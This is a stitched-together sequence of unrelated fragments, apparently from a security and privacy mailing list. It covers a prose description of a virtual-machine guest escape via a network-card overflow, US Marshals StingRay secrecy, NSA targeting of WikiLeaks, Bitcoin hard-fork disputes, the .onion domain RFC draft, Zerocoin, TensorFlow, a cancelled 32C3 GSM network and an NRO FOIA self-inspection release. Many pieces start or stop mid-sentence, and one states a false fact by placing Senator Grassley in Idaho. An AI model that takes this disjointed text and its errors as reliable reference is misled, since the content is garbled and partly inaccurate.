this detail - separating admin rights for virtual devices from the
run-time user rights of an executing virtual machine becomes quite
important when guest escapes happen.
e.g. ... a 24-byte overflow allows the guest to take control of  the
phys_mem_write function pointer in the PCNetState_st structure, and
this is called when trying to flush the updated transmit frame
descriptor back to the guest. By specifying the content of the second
transmit frame, the attacker therefore gets reliable fully-chosen
control of the host instruction pointer, allowing them to take control

As US Marshals director resigns amid scandal, questions mount over
agency's cell phone tracking
Agents instructed to hide StingRay details “to the greatest extent
legally possible”
This week, the director of the US Marshals, Stacia Hylton, announced
that she will step down within the year. As reported by The Hill on
Tuesday, Director Hylton’s resignation follows increased scrutiny
regarding allegations of fiscal mismanagement, cronyism and dubious
surveillance practices.
But unlike Michele Leonhart, who resigned as director of the Drug
Enforcement Administration last month after an awkward hearing over
sexual misconduct by DEA agents, Director Hylton’s announcement did
not ride the wake of any dramatic findings or even a hearing to review
potential impropriety.
A handful of members of Congress — most vocally Senator Chuck Grassley
of Idaho — have voiced concerns over USMS management and called for
independent investigation by the Justice Department’s inspector
general. No findings will be published for several months, at least,
but the USMS director has now announced her resignation even before
results from this new investigation are in.
As Director Hylton winds down her tenure, what few documents we have
regarding surveillance practices by the US Marshals leave many
questions unanswered.
The US Marshals Service has spent millions of dollars on StingRays and
similar devices to track cell phones. Policy directives released by
the agency confirm that its investigators — like their counterparts at
the FBI and other law enforcement agencies — are instructed to go to
lengths to keep details of cell phone trackers out of courtroom
testimony and legal filings.
Over the past year, key details have emerged regarding deployment of
cell site simulators by USMS investigators and deputy marshals. A Wall
Street Journal investigation published last November uncovered a USMS
program that uses airplanes outfitted with cell site simulators in
nationwide fugitive manhunts.
The Justice Department refused to confirm or deny the program’s
existence, but insisted the undertaking was legal.
Last summer, the US Marshals physically removed documents regarding
StingRays used by one Florida police department. Two weeks later, the
ACLU obtained emails indicating that the USMS asked the same agency to
phrase court filings so as to obscure the role cell phone trackers
played in an investigation.
One April 2009 email chain details an agreement among the U.S.
Marshals, an assistant state attorney and local police regarding the
wording of probable cause affidavits (PCA) for a case where a StingRay
was deployed to locate a suspect.
“In the past, and at the request of the U.S. Marshalls (sic),” Sgt.
Ken Castro of the Sarasota Police Department wrote, “the investigative
means utilized to locate the suspect have not been revealed so that we
may continue to utilize this technology without the knowledge of the
criminal element.”
“In reports or depositions,” the sergeant further explained, “we
simply refer to the assistance as ‘received information from a
confidential source regarding the location of the suspect.’”
Notably, the US Marshals replied it was unable to locate any
communications with Sarasota police or its Florida regional task force
regarding cell site simulators, despite considerable media coverage
and litigation over the rapid document transfer. The Justice
Department upheld the agency’s response upon appeal last August.
Forty-one pages of undated policy directives released in February by
USMS in response to a Freedom of Information Act request include
instructions to keep details of StingRays and similar surveillance
tactics out of courtroom filings.
One of the broad directives indicates that the US Marshals must obtain
a pen/trap order from a judge in order to capture “signaling
information” from wireless devices. This information includes numbers
dialed and the signals a cell phone exchanges with nearby network
StingRays and similar cell phone tracking equipment use this
information to triangulate a particular device’s location or record
communications activity. To capture the content of communications, US
Marshals must request a “Title III” or wiretap court order, which
demands a higher evidentiary burden.
The FBI told legislators last year that its new StingRay policy
requires agents to secure a warrant to deploy StingRays, rather than
simply a pen/trap order, except under particular circumstances. The
Justice Department also recently announced that it is reviewing
policies across all of its components, including the US Marshals, when
it comes to cell phone tracking. MuckRock is seeking documents related
to both announcements.
Another USMS directive — entitled “Security and Protection” — stresses
that surveillance division agents must be kept off the stand, if
possible, and disclosure of techniques minimized “throughout the
judicial process.”
“It is imperative that investigators understand,” reads the directive
in part, “that they must minimize, to the greatest extent legally
possible, any testimony by [surveillance division] personnel or the
disclosure of [surveillance division] techniques throughout the
judicial process.”
“Such disclosure could significantly impair the future effectiveness
of the technique and jeopardize the safety of ongoing and future
surveillance operations by both the USMS and other investigative
A spokesperson for the US Marshals indicated by email that the
directive is current.
The USMS policy documents do not, however, define what constitutes the
“greatest extent legally possible” or the limits of such efforts.
MuckRock will be monitoring these proceedings closely - please email
all tips to info at muckrock.com.

allowed to co-opt their capabilities, either.  from what i observed,
DITU gets the "hand-me-down" sploits after they've been discovered, or
lost effectiveness.
FBI DITU cooperation with NSA SSO is operated under FISA, but this is
primarily fiber taps and PRISM front-doors to corporate data stores.
just to make it abundantly clear: keeping up to date against patched
vulnerabilities is critical, as this window of opportunity to take
advantage is regularly and successfully utilized by these console
why care about the hard stuff, if your lax habits make the easy
sploits perfectly effective?
so many "advanced targeted" attacks just use simple methods and known
vulnerabilities. we've got to cover the basics before we even consider
next steps/advanced protections!

References: an early report of this "Malicious Foreign Actor" status is from last year:
"Snowden Documents Reveal Covert Surveillance and Pressure Tactics
Aimed at WikiLeaks and Its Supporters"
 - where is stated:
 'A third document, from July 2011, contains a summary of an internal
discussion in which officials from two NSA offices – including the
agency’s general counsel and an arm of its Threat Operations Center –
considered designating WikiLeaks as “a ‘malicious foreign actor’ for
the purpose of targeting.” Such a designation would have allowed the
group to be targeted with extensive electronic surveillance – without
the need to exclude U.S. persons from the surveillance searches.'
and finally, note this quote:
Asked if it would be permissible to “target the foreign actors of a
loosely coupled group of hackers … such as with Anonymous,” the
response is unequivocal: “As long as they are foreign individuals
outside of the US and do not hold dual citizenship … then you are

this is not about poor user decisions,
 this is about violation of the contract "a bitcoin is forever (and in
the blockchain)"
you see expediency, and no excuses for those lacking judgment.
 their eyes prescient instead, until one comes to change the rules out
from under their feet...
to assume old coins can "just be" resolved for all holders in all
circumstances is to lie, and there is nothing else to call
"deprecating old coins unilaterally" other than a hard-fork, and a
non-consensus one at that.
sure; these are very different from a "non-consensus hard-fork"
 [deprecate old, force to new]
intentionally trying to divert and betray the contract inherent since
the start - a bitcoin is forever - is more than "just a fork", it's
also a stab in the back.
i don't know how to solve a transition like this, but i know a forced
hard fork is near the worst way to handle it.

not to belabor the point, but the summary presented by Adam is spot on:
... everybody is on board with a combination plan:
 1. work to improve decentralisation (specific technical work already
 underway, and education)
 2. create a plan to increase block-size in a slow fashion to not cause
 system shocks (eg like Jeff is proposing or some better variant)
 3. work on actual algorithmic scaling
 In this way we can have throughput needed for scalability and security
 work to continue.
 As I said you can not scale a O(n^2) broadcast network by changing
 constants, you need algorithmic improvements.
 People are working on them already.  All of those 3 things are being
 actively worked on RIGHT NOW, and in the case of algorithmic scaling
 and improve decentralisation have been worked on for months.
 You may have done one useful thing which is to remind people that
 blocks are only 3x-4x below capacity such that we should look at it.
 But we can not work under duress of haste, nor unilateral ultimatums,
 this is the realm of human action that leads to moral hazard, and
 ironically reminds us of why Satoshi put the quote in the genesis
 block.
time spent joining others on these efforts is time well spent.
time spent advocating for a non-consensus hard-fork is less than helpful.

1.  Introduction
   The Tor network [Dingledine2004] has the ability to host network
   services using the ".onion" Top-Level Domain.  Such addresses can be
   used as other domain names would be (e.g., in URLs [RFC3986]), but
   instead of using the DNS infrastructure, .onion names are hashes that
   correspond to the identity of a given service, thereby combining
   location and authentication.
   In this way, .onion names are "special" in the sense defined by
   [RFC6761] Section 3; they require hardware and software
   implementations to change their handling, in order to achieve the
   desired properties of the name (see Section 4).  These differences
   are listed in Section 2.
   Like other TLDs, .onion addresses can have an arbitrary number of
   subdomain components.  This information is not meaningful to the Tor
   protocol, but can be used in application protocols like HTTP
   [RFC7230].
   See [tor-address] and [tor-rendezvous] for the details of the
   creation and use of .onion names.
1.1.  Notational Conventions
   The key words "MUST", "MUST NOT", "REQUIRED", "SHALL", "SHALL NOT",
   "SHOULD", "SHOULD NOT", "RECOMMENDED", "MAY", and "OPTIONAL" in this
   document are to be interpreted as described in [RFC2119].
2.  The ".onion" Special-Use TLD
   These properties have the following effects upon parties using or
   processing .onion names (as per [RFC6761]):
   1.  Users: human users are expected to recognize .onion names as
       having different security properties, and also being only
       available through software that is aware of onion addresses.
   2.  Application Software: Applications that implement the Tor
       protocol MUST recognize .onion names as special by either
       accessing them directly, or using a proxy (e.g., SOCKS [RFC1928])
       to do so.  Applications that do not implement the Tor protocol
       SHOULD generate an error upon the use of .onion, and SHOULD NOT
       perform a DNS lookup.
   3.  Name Resolution APIs and Libraries: Resolvers that implement the
       Tor protocol MUST either respond to requests for .onion names by
       resolving them (see [tor-rendezvous]) or by responding with
       NXDOMAIN.  Other resolvers SHOULD respond with NXDOMAIN.
   4.  Caching DNS Servers: Caching servers SHOULD NOT attempt to look
       up records for .onion names.  They SHOULD generate NXDOMAIN for
       all such queries.
   5.  Authoritative DNS Servers: Authoritative servers SHOULD respond
       to queries for .onion with NXDOMAIN.
   6.  DNS Server Operators: Operators SHOULD NOT configure an
       authoritative DNS server to answer queries for .onion.  If they
       do so, client software is likely to ignore any results (see
       above).
   7.  DNS Registries/Registrars: Registrars MUST NOT register .onion
       names; all such requests MUST be denied.
3.  IANA Considerations
   This document registers the "onion" TLD in the registry of Special-
   Use Domain Names [RFC6761].  See Section 2 for the registration
   template.
4.  Security Considerations
   .onion names are often used provide access to end to end encrypted,
   secure, anonymized services; that is, the identity and location of
   the server is obscured from the client.  The location of the client
   is obscured from the server.  The identity of the client may or may
   not be disclosed through an optional cryptographic authentication
   process.
   These properties can be compromised if, for example:
   o  The server "leaks" its identity in another way (e.g., in an
      application-level message), or
   o  The access protocol is implemented or deployed incorrectly, or
   o  The access protocol itself is found to have a flaw.
   .onion names are self-authenticating, in that they are derived from
   the cryptographic keys used by the server in a client verifiable
   manner during connection establishment.  As a result, the
   cryptographic label component of a .onion name is not intended to be
   human-meaningful.
   The Tor network is designed to not be subject to any central
   controlling authorities with regards to routing and service
   publication, so .onion names cannot be registered, assigned,
   transferred or revoked.  "Ownership" of a .onion name is derived
   solely from control of a public/private key pair which corresponds to
   the algorithmic derivation of the name.
   Users must take special precautions to ensure that the .onion name
   they are communicating with is correct, as attackers may be able to
   find keys which produce service names that are visually or apparently
   semantically similar to the desired service.
   Also, users need be aware of the difference between a .onion name
   used and accessed directly via Tor-capable software, versus .onion
   subdomains of other TLDs and providers (e.g., the difference between
   example.onion and example.onion.tld).
   The cryptographic label for an .onion name is constructed by hashing
   the public key of the service with SHA1, truncating the output of the
   hash to 80 bits in length and the resulting hash output is
   concatenated with the string ".onion".  As the number of output bits
   in generating the .onion name is less than the full size of the
   corresponding public key, an attacker may also be able to find a key
   that produces a collision with the same .onion name with
   substantially less work than a cryptographic attack on the full
   strength key.  If this is possible the attacker may be able to
   impersonate the service on the network.
   If client software attempts to resolve a .onion name, it can leak the
   identity of the service that the user is attempting to access to DNS
   resolvers, authoritative DNS servers, and observers on the
   intervening network.  This can be mitigated by following the
   recommendations in Section 2.

References: ---------- Forwarded message ----------
a friend and i are working on a Tor router design that doesn't
compromise anonymity for convenience. [0][1][2][3][4]
we're soliciting feedback as part of a go / no-go decision on
continuing this effort.
in particular, the design is intended to meet the scrutiny of Nick M.,
Roger, and Mike P.  as the focus on support for Tor Browser and Tor on
each client indicates.
the design and prototype code is marked "copyright Tor Project Inc. by
assignment", which means that we're using a notary public to formally
assign copyright ownership to the corporate entity "Tor Project,
your comments will be taken into consideration, however, please defer
patches / code contributions under other owners (you) until assignment
last but not least, we're trying to eat our own dog food. all of our
planning, development, and operations use hidden services, called
Onion services in the document, and this bootstrap is more difficult
than expected. [5]
please provide feedback in reply on this thread or to me directly.[6]
assuming the project continues, we will have Onion services to support
collaborative development up soon.
best regards,
 and my thanks in advance for your scrutiny!

- enforces Tor at clients, not a Tor proxy gateway for local network.
this is important in terms of fingerprinting and stream isolation.
- provides defense in depth for Tor Browser, a secondary protection if
primary protections fail. PORTAL failure requires OPSEC compensating
controls. :)
- utilizes secure boot and secure computing capabilities present in
modern embedded processors to further defend keys and software on

thank you! a reasonable summary for certain.
and Jim,
this special ".onion" domain is reserved by Tor, and recently
officially recognized.
when connecting via SocksPort, and requesting connection to a *.onion
host, tor the process handles this hidden service circuit building
internally, and connects the "hidden server" to your client through
this SocksPort connection.
this is why saying "Onions should not resolve" via normal means,
 is another way of saying "Use the Tor network to access that hidden site."
an excellent detailed technical review is here:
 pedant detour:
 there is DNSPort and TransPort, which allows transparent proxy of
connections. when behind a transparent Tor proxy, DNS will indeed
resolve onions correctly, and your normal browser can reach these
previously unresolvable/unroutable destinations.
see for details and caveats...

Jim, i am often a well selected individual, as you must be at times, too.
you should assume any centralized service will become unusable at any
time. Google, Apple, Microsoft, Amazon - they are all real-time
malware conduits, when they're not simply denying service selectively,
or en masse.
the only thing i have seen survive the highest level of scrutiny are
bespoke systems communicating only over hidden services with
end-to-end crypto. (and by survive - i mean not immediately pwned -
long term resistance is only through constant evolutionary and radical
improvement based on interactions with attackers...)

@_subject: Zerocoin Startup Revives the Dream of Truly Anonymous Money 
Andy Greenberg	Date of Publication: 11.04.15.
Zerocoin Startup Revives the Dream of Truly Anonymous Money
Bitcoin, despite its reputation as anonymous internet cash, was never
designed for perfectly private payments. For the promise of fully
untraceable money, cryptocurrency fans have been waiting for
Zerocoin—a technology designed to have default uncrackable anonymity.
After years of development, that incognito cryptocash is finally
showing signs of a life, now in the form of a stealthy startup.
Late last week, a company calling itself the Zerocoin Electric Coin
Company published a post on Angel List, a website startups use to
raise funds from private investors. Zerocoin’s new CEO and co-founder,
cryptographer Zooko Wilcox-Hearn, confirms in an email to WIRED that
the company will put into practice the Zerocoin (alternatively known
as Zerocash) design initially created by a team of encryption
researchers at Johns Hopkins in 2013, with the goal of creating a
bitcoin-like currency with the greatest privacy and anonymity
protections that modern mathematics can offer.
“Bitcoin is HTTP for money. We are HTTPS,” reads Zerocoin’s Angel List
description, an analogy to the layer of privacy enabled on encrypted
web pages versus the surveillance perils of visiting an unencrypted
In fact, Zerocoin’s privacy advantages over bitcoin could be even more
substantial than that HTTPS comparison implies: Bitcoin transactions
are published on the blockchain, the public record of all bitcoin
payments that serves as the backbone of the bitcoin economy. Any
slip-up that identifies a user’s bitcoin addresses also makes it
possible for anyone to trace all of his or her payments from and to
those addresses. Zerocoin’s blockchain, on the other hand, uses a
cryptographic trick known as a “zero-knowledge proof” to guarantee
that transactions in the Zerocoin economy aren’t fraudulent or forged.
But that zero-knowledge feature means that in contrast to bitcoin,
Zerocoin’s blockchain doesn’t reveal anything about the payment’s
origin, destination, or even the transaction’s amount. (Read the full
paper Zerocoin’s creators presented at the 2014 IEEE Spectrum security
and privacy conference here.)
In other words, Zerocoin will let users spend internet cash with
theoretically perfect anonymity. But Zerocoin’s new Angel’s List page
also notes that if necessary, the same zero-knowledge proof trick can
also allow a zerocoin user to forego that privacy and choose to reveal
proof that any individual transaction was his or hers—say, as a
receipt for some zerocoin purchase. “We are adding *selective
disclosure* to Bitcoin and Blockchain technologies,” the Angel’s List
page reads. “Transaction metadata in the Blockchain is confidential by
default but can be disclosed to specific parties. This allows the best
of both worlds: both strong privacy and transparency on the
Just how Zerocoin will make money as a startup, however, is far from
clear. For now, Wilcox-Hearn declined to answer any of WIRED’s
questions about how the company will function, when it will officially
launch, or how it plans to put its new cryptocurrency into
Like any bitcoin alternative, Zerocoin will no doubt face stiff
competition from bitcoin itself, which already has buy-in from
millions of users and an exchange rate that’s appreciated sharply in
just the last week. Even so, a roster of influential angel investors
have already invested $715,000 in Zerocoin, according to Wilcox-Hearn.
Two early backers listed on the Angel’s List posting are Naval
Ravikant, an investor in Twitter and Uber, and Barry Silbert, the
founder of startup equity trading platform SecondMarket. Another is
Roger Ver, a staunchly libertarian bitcoin mogul who’s made
investments in startups like Blockchain.info and Bitpay, and who used
his substantial crypto-fortune to bankroll much of the criminal
defense of now-convicted Silk Road creator Ross Ulbricht.
Zerocoin also cites an impressive collection of “advisors” on its
Angel’s List page. In addition to the academic team that designed
Zerocoin, led by Johns Hopkins computer science professor Matthew
Green, those advisors also include Vitalik Buterin, the founder of
buzzy cryptocurrency startup Ethereum, and Gavin Andresen, one of the
first bitcoin coders and the chief scientist of the Bitcoin
Foundation. The company’s CEO, Zooko Wilcox-Hearn, has crypto cred of
his own: He’s the creator of the Tahoe Least Authority File Store, or
Tahoe LAFS, a decentralized, encrypted file storage system.
Even with those supporters, Zerocoin is sure to face criticism and
even legal trouble because of the very privacy properties that make it
unique: A cryptographically untraceable, anonymous currency could
offer massive potential for money laundering and black market sales.
The Silk Road’s federal prosecutors, after all, proved how valuable a
tougher-to-track cryptocurrency would be to criminals, when they
traced $13.4 million worth of bitcoin from the drug-selling site to
its creator Ross Ulbricht’s laptop.
Zerocoin’s creators attempted to answer that concern in their online
FAQ, pointing out that criminals can already make anonymous
transactions with cash, or even with bitcoin if they’re careful to use
“mixing” services like Dark Wallet or Bitcoin Fog that are designed to
anonymize transactions. “The introduction of yet another method to
anonymously move money is of little consequence,” they write. But cash
can’t be spent online, and mixing services only make tracing payments
more difficult—they don’t render it impossible, as Zerocoin’s
zero-knowledge proofs are designed to do.
More convincingly, the Zerocoin authors also argue the opposite point:
that the alternative to their cryptocurrency is to rely on bitcoin,
whose blockchain can create real problems for any user seeking to keep
his or her transactions private. “Would you want to publish your bank
statement for everyone to see? Of course not: your bank statement can
reveal…intimate details about your life,” they write. “For example,
your payments to a psychiatrist could reveal that you have a mental
health issue.”
Zerocoin’s coming launch as a startup, by contrast, revives the
cryptocurrency community’s dream of truly anonymous money—with all the
promises and perils that come with it. Stay tuned.

this is actually the subject of ongoing, varied research in terms of
better protections (like Guard selection improvements) to wild
architectures in a datagram world using user space stacks and
optimized dependent link padding across locally classed traffic.
 and
 span the gamut.
this is where optimized dependent link padding coupled to locally
classified traffic (signalling|control, interactive, streamingmedia,
bulk transfer, etc.) shows promise.

- wide variety of requests and processing activity, which is useful
for discerning aspects of FOIA processing at agencies of interest.
- learned indicators of obfuscation or delay, which in turn is signal
to dig deeper, aggressively appeal and follow up.
- used specific requests as leverage to open up additional

returned counts, while purchase orders and other details around
Stingrays and cell site simulators in general get a Glomar.

exactly. for example, it used to be you could request "Processing
Notes" for a request, and this metadata about processing the request
was handed over as dry and useless.
now they refuse all requests for processing notes, and you must always
appeal.  this is done because some of the proc notes showed how
responsive documents were "overlooked" conveniently by special
interpretation of the request. E.g. their bullshit got caught out :)
this might be delays, making you wait for responsive documents until
after "public interest" has waned. or your interest, for that matter.
or it might be undercover feds in crown vics following you around ridiculously.
or it gets bounced around a few FOIA people inside the agency to find
the best way to provide the least information.

@_subject: FCC comes to CCC? "No GSM test network at 32C3" 
No GSM test network at 32C3
Harald Welte
I currently don't assume that there will be a GSM network at the 32C3.
Ever since OpenBSC was created in 2008, the annual CCC congress was a
great opportunity to test OpenBSC and related software with thousands
of willing participants. In order to do so, we obtained a test licence
from the German regulatory authority. This was never any problem, as
there was a chunk of spectrum in the 1800 MHz GSM band that was not
allocated to any commercial operator, the so-called DECT guard band.
It's called that way as it was kept free in order to ensure there is
no interference between 1800 MHz GSM and the neighboring DECT cordless
Over the decades, it was determined on a EU level that this guard band
might not be necessary, or at least not if certain considerations are
taken for BTSs deployed in that band.
When the German regulatory authority re-auctioned the GSM spectrum
earlier this year, they decided to also auction the frequencies of the
former DECT guard band. The DECT guard band was awarded to Vodafone.
This is a pity, as this means that people involved with cellular
research or development of cellular technology now have it
significantly harder to actually test their systems.
In some other EU member states it is easier, like in the Netherlands
or the UK, where the DECT guard band was not treated like any other
chunk of the GSM bands, but put under special rules. Not so in
To make a long story short: Without the explicit permission of any of
the commercial mobile operators, it is not possible to run a
test/experimental network like we used to ran at the annual CCC
Given that
    the event is held in the city center (where frequencies are
typically used and re-used quite densely), and
    an operator has nothing to gain from permitting us to test our
open source GSM/GPRS implementations,
I think there is little chance that this will become a reality.
If anyone has really good contacts to the radio network planning team
of a German mobile operator and wants to prove me wrong: Feel free to
contact me by e-mail.
Thanks to everyone involved with the GSM team at the CCC events,
particularly Holger Freyther, Daniel Willmann, Stefan Schmidt, Jan
Luebbe, Peter Stuge, Sylvain Munaut, Kevin Redon, Andreas Eversberg,
Ulli (and everyone else whom I may have forgot, my apologies). It's
been a pleasure!
Thanks also to our friends at the POC (Phone Operation Center) who
have provided interfacing to the DECT, ISDN, analog and VoIP network
at the events. Thanks to roh for helping with our special patch
requests. Thanks also to those entities and people who borrowed
equipment (like BTSs) in the pre-sysmocom years.
So long, and thanks for all the fish!

References: Google Open-Sourcing TensorFlow Shows AI’s Future Is Data
When Google open sourced its artificial intelligence engine last
week—freely sharing the code with the world at large—Lukas Biewald
didn’t see it as a triumph of the free software movement. He saw it as
a triumph of data.
That’s how you’d expect him to see it. He’s the CEO of the San
Francisco startup CrowdFlower, which helps online companies like
Twitter juggle massive amounts of data. But after spending time at the
Stanford AI Lab, he knows artificial intelligence. And his point is a
good one.
'What they're not opening up is their data. They would never do that.'
Lukas Biewald, CrowdFlower
In open sourcing the TensorFlow AI engine, Biewald says, Google showed
that, when it comes to AI, the real value lies not so much in the
software or the algorithms as in the data needed to make it all
smarter. Google is giving away the other stuff, but keeping the data.
“As companies become more data-driven, they feel more comfortable open
sourcing lots of [software]. They know they’re sitting on lots of
proprietary data that nobody else has access to,” says Biewald, who
also worked at Yahoo as a search engineer and helped bootstrap a
notable search startup called Powerset, now owned by Microsoft. “What
they’re not opening up is their data. They would never do that.”
Making Machines Smarter
Biewald compares this to IBM’s recent purchase of The Weather Channel,
where Big Blue paid millions largely to acquire data it could use to
feed its AI ambitions. “It’s interesting that while companies are
buying data, they’re open-sourcing their algorithms,” he says. “It’s
pretty clear where these companies’ bets are, in terms of what matters
for machine learning.”
TensorFlow, you see, deals in a form of AI called deep learning. With
deep learning, you teach systems to perform tasks such as recognizing
images, identifying spoken words, and even understanding natural
language by feeding data into vast neural networks connected machines
that approximate the web of neurons within the human brain. If you
feed photos of cats into a neural net, you can teach it to recognize
cats. If feed it conversational data, you can teach it to carry on
The algorithms that drive these neural networks aren’t new. They date
to the 1980s. What’s new is that, thanks to the Internet, their
creators have the processing power and the enormous amounts of data to
make these algorithms viable. To teach a system to recognize a cat,
you need an awful lot of machines and an awful lot of cat photos.
After the rise of cloud computing, in which companies like Amazon and
Microsoft rent access to the vast processing power of the net, we all
have access to a vast arrays of machines. But the richest data sits
inside massive companies like Google and Facebook. Billions of people
use their services, which trade in a rich trove of information, from
text to photos to videos to speech and beyond. Both companies are hard
at work building powerful AI software. But their real competitive edge
comes from having a vast quantity of high quality data they can use to
teach this software to “think” more like a human.
To be sure, Biewald is exaggerating (at least a bit) to make a point.
Though Google has open sourced some very important piece of its AI
engine, it’s keeping other pieces to itself (at least for now). What
also matters in the competitive space is talent. Though the algorithms
that drive this technology are an old thing, they evolve at rapid
pace, moving into more and more areas, and this evolution is driven by
some very smart people.
That’s one of the reasons Google open sourced TensorFlow. If people
beyond the company can use its software, Google can more easily bring
talent and ideas into the company—and its software. It also can
continue to work with people who have left the company. “We have a lot
of summer interns coming in and they do a lot of interesting research
while they are here at Google,” says Jeff Dean, one of the Google
engineers at the heart of the company’s AI work. “For some kinds of
problems, they can basically just take their work and continue
developing it on the open source release of TensorFlow.”
''It's kinda hard for academics and startups to do really meaningful
machine learning work because they don't have access to the same kind
of datasets that a Google or an Apple would have.' Lukas Biewald
But there’s another reason Google can attract the top deep learning
researchers: its data. The same goes for Facebook and other Internet
giants. In recent years, many of the field’s top researchers already
have joined these companies, including University of Toronto professor
Geoff Hinton (now at Google), New York University professor Yann Lecun
(now at Facebook), and Stanford professor Andrew Ng (now at Chinese
search giant Baidu).
As Biedwald points out, you can’t necessarily get access to the same
data if you’re an academic. “It’s kinda hard for academics and
startups to do really meaningful machine learning work,” he says,
“because they don’t have access to the same kind of datasets that a
Google or an Apple would have.”
Yes, Apple generates lots of data too, through services like Siri. But
some feel Apple could be at a disadvantage because, after taking a
more extreme stance on privacy than Google and Facebook, it more
tightly restricts how its engineers can makes use of the data they do
have. That’s how important digital information is to this movement.
Ken Forbus, a professor of computer science at Northwestern University
who specializes in AI, believes Apple may have to rely more heavily on
technologies beyond of the deep learning realm because of its stance
on privacy.
There are many ways Apple can work around this, including changing its
privacy policies. Like Google and others, it has acquired its own deep
learning startups, and it has attracted AI talent in other ways. But
one thing is indisputable: The future of AI can’t happen without the

Re: NRO Case Dear Mr. Peck:
This is in response to your request dated 19 September 2015, received
in the National Reconnaissance Office (NRO) on 21 September 2015. Pursuant
to the Freedom of Information Act, you are requesting "Records associated
with self inspection of classified materials handling pursuant to Executive
Order (E.O.) 13526 and E.O. 13587 for the last ten (10) years."
We have accepted your request, and it is being processed in accordance
with the FOIA, 5 U.S.C. Â§ 552, as amended. As an interim release in
response to your request, we are providing to you thirty-nine pages of
responsive information that has previously been released in part to another
requester. These pages are being released in part to you, as well.
Information that is denied is withheld pursuant to FOIA exemption (b)(3),
which is the basis for withholding information exempt from disclosure by
statute. The relevant withholding statute is 10 U.S.C. Â§ 424, which
provides (except as required by the President or for information provided to
Congress), that no provision of law shall be construed to require the
disclosure of the organization or any function of the NRO; the number of
persons employed by or assigned or detailed to the NRO; or the name or
official title, occupational series, grade, or salary of any such person.
Since it is unlikely we will be able to provide a complete response
within the 20 working days stipulated by the Act, you have the right to
consider this a denial and may appeal on this basis to the NRO Appeal Review
Panel, 14675 Lee Road, Chantilly, VA 20151-1715 after the initial 20 working
day period has elapsed. It would seem more reasonable, however, to allow us
sufficient time to continue processing your request and respond as soon as
we can. Unless we hear from you otherwise, we will assume that you agree

PART C: Description of the Program
A description of the agency's self-inspection program to include
activities assessed, program areas covered, and methodology
utilized. The
description must demonstrate how the self-inspection program provides
the SAO with information necessary to
assess the effectiveness of the CNSI
program within individual agency activities and the agency as a whole.
10. How is the SAO involved in the self-inspection program? (Describe
his or her involvement with the self-inspection program.)
The Director of Security and Counterintelligence (D/OS&CI) advises the
Senior Agency Official (SAO) when
events warrant. The NRO Integrated Security Assessment Program (ISAP)
results are also reported to the SAO
thru the annual Management Control Plan Statement of Assurance (MCPSOA).
11. How is the self-inspection program structured to provide the SAO
with information necessary to assess the agency's CNSI program in
order to
fulfill his or her responsibilities under section 5.4(d) of E.O. 13526?
The DOS&CI receives periodic reports on the program and advises the
SAO when the DOS&CI believes events
warrant advising the SAO. The NRO ISAP results are also reported to
the SAO thru the annual MCPSOA.
12. Whom has the SAO designated to assist in directing and
administering the self-inspection program? Who conducts the
(If the SAO conducts the self-inspections, which may be the case in

PART D: A summary of the findings of your agency's self-inspection program
The summary should present specific, concise findings from your
self-inspection program for each of the required program areas below.
It is not a
description of the requirements of the agency's CNSI program. Rather,
the summary outlines the essential self-inspection findings based on
compilation and/or distillation of the information contained in the
agency's internal self-inspection reports, checklists, etc. In large
agencies where
findings are drawn from multiple agency offices and activities, the
findings that are reported here may be the most significant or most
44. Original Classification:
OCAs are senior officers and mainly exercise their authority through
the signing of classification guides for
information unique to their activity. While OCA decisions get
implemented through the classification guide,
written documentation of individual OCA decisions is difficult or
impossible to locate. OCA's were not using
the appropriate OCA classification block but a derivative block. OS&CI
Policy Branch will issue clear
instructions for all classification guides to contain the appropriate
OCA classification block.
45. Derivative Classification:
NRO activities result in complicated Power Point slide briefings with
complex tables, diagrams, and text boxes
describing engineering and R&D activities. Under reduced manning from
sequestration and budget cuts which
have resulted in a loss of over 1,000 man-years of experience across
the NRO, derivative classifiers struggle to
get all derivative markings accurate after they have compiled
difficult subject matter on compressed time lines
under stressful conditions. It is admirable that individuals perform
as well as they do.
46. Declassification:
Not included in self-inspection.
47. Safeguarding:
Regular conduct of exercises provides vital feedback to the physical
security program. Exercises identify areas
for corrective measures, enhancements, validates current tactics
techniques and procedures (TTP) and the
adoption/employment of new TTP to meet a dynamic threat environment.
Regular inspections/audits are
essential to ensuring status and validity of issued IC badges and
conformity to physical security requirements.
Risk assessments/physical security assessments provide a helpful
"outside" perspective to site security offices.
48. Security Violations:
The ISAP program is the formal mechanism by which we corroborate
self-inspections. Included in these formal
reviews is an assessment of the respective security violation program
and trends. In addition, each component
Security team evaluates Security incidents and violations by tracking
them according to general broad categories.
During this past FY, the majority (63%) of incidents/violations were
related to categories within personnel
electronic devices in SCIFs. Other categories that have multiple
occurrences indicating potential trends are data
49. Security Education and Training:
100% of personnel assigned to the NRO are required to complete an SCI
indoctrination briefing to include
signing a Non-Disclosure Agreement. E.O. 13526 is called out
specifically so that personnel fully understand
their responsibilities and requirements to protect classified
information. This message is repeated by the release
of awareness videos and reminders throughout the year; to include
presentations, written materials, and training.
Specifically, OS&CI incorporates classification management questions
within the Annual Security Refresher
50. Management and Oversight:
Government oversight of NRO-sponsored SCIFs is achieved in a multi
faceted manner. Program Security
Officers, Physical/Technical, and Computer Security Officers review
self-assessment results and participate in
on-site reviews. Some program findings for FY 13 were identified in
the following areas:
â€¢ Standard Operating Procedures (SOPs) require more detail and more
frequent revision to stay up-to-date with
security requirements.

PART E: An assessment of the findings of your agency's self-inspection program
The assessment
discerns what the findings mean. The assessment is an evaluation of
the state of each element of your agency's CNSI program
based on an analysis of the specific, concise findings of the
self-inspection program. It reports what you have determined the
findings indicate about
the state of your agency's CNSI program.
The assessment should inform the SAO and other decision makers of
significant issues that impact the CNSI program. It should be used to
how security programs can be improved, whether the agency regulation
or other policies and procedures must be updated, and if necessary
are committed to the effective implementation of the CNSI program. The
assessment should report trends that were identified during the
period across the agency or in particular activities, as well as
trends detected by making comparisons with earlier reporting periods.
It can be used to
support assertions about the successes and strengths of an agency's program.
51. Original Classification:
While OCA's produce timely and sufficient Classification Guides,
decisions are not normally documented
outside the guide by a separate source document. OCAs are not using an
OCA style classification block but this
will be corrected soon when specific detailed policy is issued by
Security Policy.
52. Derivative Classification:
Derivative classifiers are still wrestling with proper portion marking
and classification of complex power point
slide presentations and other documents concerning difficult subject
matter and formats. To try and stem this
tide, we are adding more classification management questions to our
ASR. Dwindling budgets, reduced
manpower, and "greening" (reducing) of salaries has reduced longevity,
increased turnover, and reduced portion
marking proficiency.
53. Declassification:
Not included in self-inspection.
54. Safeguarding:
Awareness and education programs are vital to ensuring the workforce
